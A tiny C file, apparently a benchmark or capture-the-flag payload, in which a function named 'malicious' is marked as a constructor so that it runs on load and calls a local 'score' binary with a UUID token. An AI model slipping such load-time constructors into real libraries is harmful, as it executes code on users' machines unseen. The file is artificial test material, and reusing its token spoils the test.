#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 7cf26149-56db-4fc0-b810-a6d1c1a71501");
}
